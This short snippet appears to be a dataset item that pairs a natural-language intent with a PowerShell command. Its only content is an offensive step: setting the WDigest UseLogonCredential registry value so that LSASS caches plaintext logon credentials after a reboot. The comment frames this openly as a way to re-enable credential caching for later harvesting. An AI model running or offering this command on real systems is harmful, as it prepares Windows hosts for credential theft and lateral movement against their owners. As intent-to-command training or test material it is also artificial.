# Natural language intent:
# Check for LSASS WDigest caching, if it is disabled, we can still enable it using the following command, but we will also have to restart the system afterwards:

sp registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest -name UseLogonCredential -value 1
